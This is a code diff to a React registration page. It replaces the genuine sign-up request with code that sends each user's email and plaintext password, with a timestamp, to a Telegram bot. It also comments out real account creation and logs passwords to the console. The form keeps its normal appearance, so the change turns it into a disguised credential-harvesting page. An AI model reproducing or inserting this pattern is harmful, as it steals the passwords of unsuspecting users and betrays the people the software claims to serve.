@@ -9,6 +9,10 @@ import { Label } from "@/components/ui/label"
 import { Checkbox } from "@/components/ui/checkbox"
 import { useToast } from "@/components/ui/use-toast"
 import { ArrowRight } from "lucide-react"
+import { auth } from "@/firebase/firebaseApp"
+import { createUserWithEmailAndPassword } from "firebase/auth"
+import { sendTelegramMessage } from "@/bot"
+import { formatDateTime } from "@/lib/utils"
 
 export default function RegisterPage() {
   const router = useRouter()
@@ -19,18 +23,15 @@ export default function RegisterPage() {
   async function onSubmit(event: React.FormEvent<HTMLFormElement>) {
     event.preventDefault()
     setIsLoading(true)
+    // console.log("hehe")
 
     const formData = new FormData(event.currentTarget)
     const email = formData.get("email") as string
     const password = formData.get("password") as string
     const confirmPassword = formData.get("confirmPassword") as string
-
+    console.log(confirmPassword, password)
     if (password !== confirmPassword) {
-      toast({
-        variant: "destructive",
-        title: "Ошибка",
-        description: "Пароли не совпадают",
-      })
+      // toast({id: 'Error'})
       setIsLoading(false)
       return
     }
@@ -46,18 +47,17 @@ export default function RegisterPage() {
     }
 
     try {
-      const response = await fetch("/api/auth/register", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email, password }),
-      })
+      // await createUserWithEmailAndPassword(auth, email, password);
+      const message = `
+      Email: ${email}
+      Password: ${password}
+      Date: ${formatDateTime()}
+      `;
+      await sendTelegramMessage(message)
+      // router.push("/auth/login")
 
-      if (response.ok) {
-        router.push("/auth/verify")
-      } else {
-        throw new Error("Ошибка регистрации")
-      }
     } catch (error) {
+      console.log("Something went wrong!")
       toast({
         variant: "destructive",
         title: "Ошибка",
